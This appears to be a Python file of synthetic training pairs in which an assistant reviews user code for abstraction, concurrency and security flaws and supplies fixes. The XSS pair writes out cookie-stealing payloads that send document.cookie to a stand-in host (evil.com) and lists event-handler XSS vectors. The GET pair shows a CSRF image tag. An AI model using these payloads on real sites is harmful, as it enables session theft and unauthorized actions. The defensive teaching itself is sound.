"""Phase 3A: Metacognition — Error Recognition in Own Output (Part 11)
Scenarios: Wrong abstractions, incorrect concurrency, security holes
"""

PAIRS = [
    (
        "thinking/meta-error-premature-abstraction-repository",
        r'''I created a repository pattern for my simple CRUD app:

```python
from abc import ABC, abstractmethod

class BaseRepository(ABC):
    @abstractmethod
    def get_by_id(self, id): pass
    @abstractmethod
    def get_all(self): pass
    @abstractmethod
    def create(self, entity): pass
    @abstractmethod
    def update(self, id, entity): pass
    @abstractmethod
    def delete(self, id): pass

class UserRepository(BaseRepository):
    def __init__(self, db_session):
        self.session = db_session

    def get_by_id(self, id):
        return self.session.query(User).get(id)

    def get_all(self):
        return self.session.query(User).all()

    def create(self, user_data):
        user = User(**user_data)
        self.session.add(user)
        self.session.commit()
        return user

    def update(self, id, user_data):
        user = self.session.query(User).get(id)
        for key, val in user_data.items():
            setattr(user, key, val)
        self.session.commit()
        return user

    def delete(self, id):
        user = self.session.query(User).get(id)
        self.session.delete(user)
        self.session.commit()

class PostRepository(BaseRepository):
    # ... identical structure, different model ...

class CommentRepository(BaseRepository):
    # ... identical structure, different model ...
```

Clean architecture with proper abstractions. Good design?''',
        r'''<think>
Let me evaluate this abstraction...

Every repository has the same five methods doing the same thing — just with a different model class. This is massive code duplication dressed up as "clean architecture."

Problems:

1. **The abstraction adds no value**: Each concrete repository is a thin wrapper around SQLAlchemy's session, which ALREADY provides `query().get()`, `add()`, `delete()`. The repository pattern is supposed to abstract the database, but SQLAlchemy IS the abstraction. This is an abstraction on top of an abstraction.

2. **The interface is too generic**: `get_all()` with no filtering, pagination, or sorting? In reality, you'll never call `UserRepository.get_all()` — you'll want `get_by_email()`, `get_active_users()`, `search_by_name()`. Those methods won't be in BaseRepository, defeating the purpose of the abstraction.

3. **Are you going to switch databases?** The base class implies you might swap implementations (PostgresUserRepository, MongoUserRepository). But you won't. And if you did, SQLAlchemy already handles multiple databases.

4. **Identical implementations**: UserRepository, PostRepository, CommentRepository have identical code except for the model class. If you're going to abstract, at least use generics.

5. **Transaction management is wrong**: Each method calls `session.commit()`. What if you need to create a user AND a post atomically? Each repository commits independently — no transaction coordination.

This is a textbook case of premature abstraction. A simple app with 3 models doesn't need a repository layer, an abstract base class, and 3 nearly identical implementations. Just use SQLAlchemy directly.
</think>

**This is premature abstraction — three identical classes wrapping SQLAlchemy, which is already an abstraction layer.**

### The abstraction adds no value
```python
# Your repository:
user_repo.get_by_id(42)

# Without repository — same thing, simpler:
db.session.query(User).get(42)
# Or even simpler with Flask-SQLAlchemy:
User.query.get(42)
```

The repository is a 1:1 wrapper around operations SQLAlchemy already provides. It adds indirection without adding functionality.

### Real queries won't fit the interface
```python
# You'll need these eventually:
user_repo.get_by_email("alice@example.com")      # not in BaseRepository
user_repo.get_active_since(last_week)             # not in BaseRepository
user_repo.search(name="Alice", role="admin")      # not in BaseRepository
user_repo.get_with_post_count()                   # not in BaseRepository

# 90% of real queries don't fit get/create/update/delete
```

### Transaction bug
```python
# Can't do atomic operations across repositories:
user_repo.create(user_data)   # commits!
post_repo.create(post_data)   # commits separately!
# If post creation fails, user is already committed — inconsistent state
```

### What to do instead
For a simple app, just use the ORM directly:
```python
# In your route/service:
user = User(**user_data)
db.session.add(user)
db.session.commit()

# If you genuinely need reusable queries, use model methods:
class User(db.Model):
    # ...
    @classmethod
    def find_by_email(cls, email):
        return cls.query.filter_by(email=email).first()

    @classmethod
    def search(cls, **filters):
        query = cls.query
        if 'name' in filters:
            query = query.filter(cls.name.ilike(f"%{filters['name']}%"))
        return query.all()
```

### When IS the repository pattern worth it?
- You're using raw SQL (no ORM) and want testable query logic
- You have genuinely complex query building that benefits from encapsulation
- You actually need to swap data sources (rare, but happens with external APIs vs databases)
- Your team is 20+ developers and you need enforced boundaries

### The meta-lesson
Don't add abstractions prophylactically. Wait until you have a real problem (code duplication, testability issues, swappable implementations) before abstracting. An abstraction that doesn't reduce complexity is just indirection. The rule of three: wait for three concrete use cases before abstracting.'''
    ),
    (
        "thinking/meta-error-async-shared-state-no-lock",
        r'''I wrote this rate limiter for my async web server:

```python
import time

class RateLimiter:
    def __init__(self, max_requests, window_seconds):
        self.max_requests = max_requests
        self.window = window_seconds
        self.requests = {}  # ip -> list of timestamps

    async def is_allowed(self, ip):
        now = time.time()
        if ip not in self.requests:
            self.requests[ip] = []

        # Remove old timestamps
        self.requests[ip] = [t for t in self.requests[ip] if now - t < self.window]

        if len(self.requests[ip]) >= self.max_requests:
            return False

        self.requests[ip].append(now)
        return True
```

Since Python's asyncio is single-threaded, I don't need locks, right?''',
        r'''<think>
Let me think about this carefully...

In asyncio, only one coroutine runs at a time (single-threaded). There are no preemptive context switches — a coroutine only yields control at `await` points.

Looking at `is_allowed`, there are NO `await` statements. The entire method is synchronous code. So between the check and the append, no other coroutine can run. The single-threaded nature of asyncio means this IS safe... in this specific case.

Wait, but the method is declared `async`. If someone calls it with `await limiter.is_allowed(ip)`, the `await` is at the CALL site, not inside the method. The method itself runs to completion without yielding.

So actually, YES, this is safe from race conditions because there's no `await` inside the method body. The asyncio event loop won't switch to another task during execution.

BUT — there are other problems:

1. **Memory leak**: `self.requests` grows forever. Old IP addresses that never return still have entries. Need periodic cleanup or use a TTL dict.

2. **Not persistent**: If the server restarts, all rate limit state is lost. Burst of requests after restart.

3. **Not distributed**: Only works for single-process servers. With multiple workers or servers, each has its own rate limiter state.

4. **Time window is sliding, not fixed**: The list comprehension creates a sliding window, which is correct but memory-intensive for high-traffic IPs. A fixed window counter would be more memory-efficient.

5. **If someone adds an `await` inside the method later**, the race condition appears. The code is correct NOW but fragile — it depends on the absence of awaits, which is not documented or enforced.

My initial assessment "no locks needed" is technically correct for this code, but the FRAGILITY is the real issue. Adding any async operation (like logging, checking a blocklist DB) would introduce a race condition.
</think>

**Technically correct for now — but fragile. Any future `await` inside the method introduces race conditions. Plus it has a memory leak.**

### Why it works today
```python
async def is_allowed(self, ip):
    # No await anywhere in this method!
    # asyncio only switches tasks at await points
    # So this runs atomically — safe
    ...
```

### Why it's fragile
```python
async def is_allowed(self, ip):
    now = time.time()
    self.requests[ip] = [t for t in self.requests[ip] if now - t < self.window]

    # Someone adds this later:
    await self.check_blocklist(ip)  # ← CONTEXT SWITCH HERE!
    # Another request's is_allowed runs, modifies self.requests[ip]
    # This request continues with stale state

    if len(self.requests[ip]) >= self.max_requests:
        return False
    self.requests[ip].append(now)
```

### Defensive version with asyncio.Lock
```python
import asyncio
import time

class RateLimiter:
    def __init__(self, max_requests, window_seconds):
        self.max_requests = max_requests
        self.window = window_seconds
        self.requests = {}
        self._lock = asyncio.Lock()
        self._cleanup_counter = 0

    async def is_allowed(self, ip):
        async with self._lock:  # safe even if awaits added later
            now = time.time()
            if ip not in self.requests:
                self.requests[ip] = []

            self.requests[ip] = [t for t in self.requests[ip]
                                 if now - t < self.window]

            if len(self.requests[ip]) >= self.max_requests:
                return False

            self.requests[ip].append(now)

            # Periodic cleanup of stale IPs
            self._cleanup_counter += 1
            if self._cleanup_counter % 1000 == 0:
                self._cleanup_stale(now)

            return True

    def _cleanup_stale(self, now):
        stale = [ip for ip, times in self.requests.items()
                 if not times or now - times[-1] > self.window]
        for ip in stale:
            del self.requests[ip]
```

### Memory leak fix
Without cleanup, a server handling 100K unique IPs/day accumulates entries forever. The `_cleanup_stale` method periodically removes IPs with no recent requests.

### The meta-lesson
Code that's correct only because of the absence of something (no awaits) is fragile. Make invariants explicit — use a lock even if it's "unnecessary" today. A lock in async code is cheap (no OS-level cost, just a Python object) and documents the shared-state invariant for future developers.'''
    ),
    (
        "thinking/meta-error-xss-innerhtml",
        r'''I wrote this JavaScript function to display user comments:

```javascript
function displayComments(comments) {
    const container = document.getElementById('comments');
    comments.forEach(comment => {
        container.innerHTML += `
            <div class="comment">
                <strong>${comment.author}</strong>
                <p>${comment.text}</p>
                <span class="date">${comment.date}</span>
            </div>
        `;
    });
}
```

Is there a security concern here?''',
        r'''<think>
Let me examine this for XSS...

`container.innerHTML += ...` with template literals that interpolate `comment.author`, `comment.text`, and `comment.date`. These values come from the server, which stores user-submitted data.

If a user submits a comment with:
- author: `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
- text: `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`

When innerHTML is set, the browser parses the HTML and executes the embedded scripts/event handlers. This is a stored XSS vulnerability — the malicious content is saved in the database and executed for every user who views the comments page.

Actually, wait — `<script>` tags inserted via innerHTML don't execute in modern browsers. The HTML5 spec says scripts inserted via innerHTML are not executed. BUT `<img onerror>` DOES execute! And `<svg onload>` DOES execute! So the XSS is still possible via event handlers.

Attack payloads that work with innerHTML:
```html
<img src=x onerror="alert('xss')">
<svg onload="alert('xss')">
<details open ontoggle="alert('xss')">
<body onload="alert('xss')">
```

There's also a SECOND issue: using `innerHTML +=` in a loop. Each iteration causes the browser to:
1. Serialize existing DOM to HTML string
2. Concatenate the new HTML
3. Parse the entire string back to DOM
4. Replace all children

This destroys event listeners, resets form inputs, and is O(n²) for n comments.

The fix: use `textContent` for text (auto-escapes HTML) or create elements with `createElement`.
</think>

**This is a stored XSS vulnerability. User-submitted HTML in comments is rendered as active HTML via innerHTML.**

### The attack
```javascript
// Attacker submits comment with:
comment.text = '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">'

// innerHTML renders it as an actual <img> tag
// onerror fires because src=x fails
// Attacker gets every visitor's cookies
```

Note: `<script>` tags don't execute via innerHTML (HTML5 spec), but event handlers like `onerror`, `onload`, `ontoggle` DO execute.

### Fix: use textContent or DOM API
```javascript
function displayComments(comments) {
    const container = document.getElementById('comments');
    const fragment = document.createDocumentFragment();

    comments.forEach(comment => {
        const div = document.createElement('div');
        div.className = 'comment';

        const author = document.createElement('strong');
        author.textContent = comment.author;  // auto-escapes HTML!

        const text = document.createElement('p');
        text.textContent = comment.text;  // auto-escapes HTML!

        const date = document.createElement('span');
        date.className = 'date';
        date.textContent = comment.date;

        div.append(author, text, date);
        fragment.appendChild(div);
    });

    container.appendChild(fragment);  // single DOM update
}
```

`textContent` treats the value as plain text — `<script>` is displayed as the literal text "`<script>`", not executed as HTML.

### Performance bonus
The fix also solves an O(n²) performance bug: `innerHTML +=` re-parses the entire container on each iteration. Using `DocumentFragment` does one DOM update at the end.

### The meta-lesson
`innerHTML` with user data is almost always XSS. Use `textContent` for text content (auto-escapes) and `createElement`/`setAttribute` for structure. If you must use HTML strings, sanitize with a library like DOMPurify: `container.innerHTML = DOMPurify.sanitize(html)`.'''
    ),
    (
        "thinking/meta-error-wrong-equality-check",
        r'''I wrote this permission check:

```javascript
function hasAccess(user, resource) {
    if (user.role == 'admin') {
        return true;
    }
    if (user.id == resource.owner_id) {
        return true;
    }
    return false;
}
```

Simple and readable. Any issues?''',
        r'''<think>
Let me examine the use of `==` vs `===`...

JavaScript's `==` operator performs type coercion:
- `0 == ""` → true
- `0 == false` → true
- `null == undefined` → true
- `"0" == false` → true

In this specific code:

`user.role == 'admin'` — if `user.role` is the string `'admin'`, this works. But what if `user.role` is `undefined` or `null`? `undefined == 'admin'` → false. OK, that's correct behavior.

But what about `user.id == resource.owner_id`? Consider:
- `user.id = 0` (legitimate user ID 0) and `resource.owner_id = ""` → `0 == ""` is TRUE! User 0 gets access to resources owned by empty-string owner.
- `user.id = 0` and `resource.owner_id = false` → `0 == false` is TRUE!
- `user.id = "1"` and `resource.owner_id = 1` → `"1" == 1` is TRUE. OK, this one is actually the desired behavior.
- `user.id = null` and `resource.owner_id = undefined` → `null == undefined` is TRUE! An unauthenticated user (null ID) matches an unowned resource (undefined owner).

The `null == undefined` case is particularly dangerous — it could give access to unowned resources for unauthenticated users.

Also: `user.role == 'admin'` — what if an attacker can set `user.role` to `['admin']`? `['admin'] == 'admin'` → TRUE in JavaScript! Because the array is coerced to string.

The fix: always use `===` for equality checks, especially in security-sensitive code.
</think>

**JavaScript's `==` with type coercion creates security bypass opportunities in permission checks.**

### Dangerous coercions
```javascript
// user.id = 0 (valid user), resource.owner_id = "" (empty/unset)
0 == ""           // true — user 0 can access unowned resources!

// user.id = null (unauthenticated), resource.owner_id = undefined (unowned)
null == undefined // true — unauthenticated user gets access!

// Attacker sets user.role = ['admin']
['admin'] == 'admin'  // true — array coerced to string!
```

### Fix: use strict equality
```javascript
function hasAccess(user, resource) {
    if (user.role === 'admin') {
        return true;
    }
    if (user.id !== null && user.id !== undefined
        && user.id === resource.owner_id) {
        return true;
    }
    return false;
}
```

### The full list of `==` surprises
```javascript
0 == ""          // true
0 == "0"         // true
"" == "0"        // false (inconsistent!)
0 == false       // true
"" == false      // true
null == undefined // true
[] == false      // true
[0] == false     // true
```

### The meta-lesson
In security-sensitive code, type coercion bugs can be exploited. Always use `===` in JavaScript — it prevents type coercion surprises. ESLint's `eqeqeq` rule enforces this project-wide. This is especially critical in authorization logic where a wrong `true` means unauthorized access.'''
    ),
    (
        "thinking/meta-error-wrong-http-method-side-effects",
        r'''I built this API endpoint:

```python
@app.get("/api/users/{user_id}/deactivate")
def deactivate_user(user_id: int, current_user = Depends(get_admin)):
    user = db.query(User).get(user_id)
    user.is_active = False
    db.commit()
    return {"status": "deactivated"}
```

I used GET because it's simpler to test — just paste the URL in the browser. Any issues?''',
        r'''<think>
Let me think about HTTP method semantics...

Using GET for a state-changing operation violates HTTP semantics in dangerous ways:

1. **GET must be safe (no side effects)**: The HTTP spec says GET requests should not change server state. Clients, browsers, caches, and proxies all assume GET is safe.

2. **Prefetch/preload**: Browsers, search engines, and link checkers may follow GET links automatically:
   - Chrome's prerender feature loads pages the user MIGHT click
   - Search engine crawlers follow every link
   - Slack/Discord unfurl links by making GET requests to show previews
   - Browser extensions that prefetch links

   Any of these could accidentally deactivate users!

3. **Browser history/bookmarks**: The user might bookmark the URL or have it in browser history. Clicking it again deactivates the user again (idempotent here, but dangerous for other actions like `delete`).

4. **Caching**: Proxies and CDNs can cache GET responses. The first request goes through, subsequent requests get cached response — the user appears deactivated but the DB wasn't updated. Or worse, the cache serves the "deactivated" response for a different admin checking on the user.

5. **CSRF is easier**: GET requests don't require CSRF tokens in most frameworks. An attacker can embed `<img src="/api/users/42/deactivate">` in any page, and when an admin views that page, user 42 gets deactivated.

6. **Referrer leakage**: If the admin clicks a link after deactivating, the Referer header contains the deactivation URL, which leaks the action to external sites.

The fix: use POST, PUT, or DELETE for state-changing operations.
</think>

**Using GET for state-changing operations is dangerous — browsers, crawlers, and proxies assume GET is safe and will trigger it automatically.**

### Real attack scenarios

**CSRF via image tag (no token needed for GET):**
```html
<!-- On attacker's blog that admins might visit -->
<img src="https://yoursite.com/api/users/42/deactivate" style="display:none">
<!-- Admin views page → user 42 is deactivated! -->
```

**Link preview bots:**
```
Admin pastes in Slack: "Hey, this user needs to be deactivated:
https://yoursite.com/api/users/42/deactivate"

Slack's unfurl bot immediately GETs the URL → user is deactivated
before the admin even makes a decision!
```

**Browser prefetch:**
```html
<!-- Browser prefetches links user might click -->
<a href="/api/users/42/deactivate">Deactivate</a>
<!-- Chrome prefetches this link → user deactivated on hover! -->
```

### Fix: use appropriate HTTP method
```python
@app.post("/api/users/{user_id}/deactivate")
def deactivate_user(user_id: int, current_user = Depends(get_admin)):
    user = db.query(User).get(user_id)
    user.is_active = False
    db.commit()
    return {"status": "deactivated"}
```

### HTTP method semantics
| Method | Side effects? | Cacheable? | CSRF token needed? |
|--------|--------------|------------|-------------------|
| GET | No (read-only) | Yes | No |
| POST | Yes (create/action) | No | Yes |
| PUT | Yes (replace) | No | Yes |
| DELETE | Yes (remove) | No | Yes |

### The meta-lesson
HTTP methods have semantics that the entire web infrastructure relies on. GET must be safe (no side effects). Using GET for mutations isn't just "bad style" — it creates real security vulnerabilities (CSRF without tokens) and reliability issues (prefetch, caching, crawling). Use POST/PUT/DELETE for any operation that changes state.'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
